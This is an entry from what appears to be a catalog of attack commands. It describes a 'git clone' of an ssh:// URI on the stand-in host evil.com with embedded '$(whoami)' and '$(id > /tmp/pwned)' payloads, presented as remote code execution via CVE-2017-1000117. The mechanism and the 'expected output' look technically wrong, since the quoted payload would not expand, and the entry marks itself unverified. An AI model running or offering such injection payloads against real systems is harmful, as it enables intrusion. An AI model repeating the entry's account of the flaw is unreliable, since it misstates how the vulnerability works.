---
data: 'git clone ''ssh://git@evil.com/$(whoami)'''
tags:
  - rce
  - git
type: command
executor: bash
platforms:
  - Linux
  - Unix-like
id: 9b801ae2-78a3-44ec-b61d-22d023b47f9a
created_at: '2025-12-14T17:23:42.320Z'
updated_at: '2025-12-14T17:23:42.320Z'
verified: false
validated: true
submitted: true
---
# git-clone-malicious-uri

## Command

```bash
git clone 'ssh://git@evil.com/$(whoami)'
```

## Description

Executes a Git clone with a malicious ssh:// URI to trigger command injection (CVE-2017-1000117), demonstrating RCE via unsanitized URI handling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `git clone` | Git command to clone repository | Yes |
| `'ssh://git@evil.com/$(whoami)'` | Malicious URI with injection payload | Yes |

## Examples

### Basic Usage

```bash
git clone 'ssh://git@evil.com/$(whoami)'
```

### Advanced Usage

```bash
git clone 'ssh://git@evil.com/$(id > /tmp/pwned)'
```

## Expected Output

Cloning into 'repo'... $(whoami) output appears, e.g., user

## Related

- [[commands/svn-checkout-malicious-uri]]
- [[procedures/Exploit-Git-ssh-URI-Injection]]
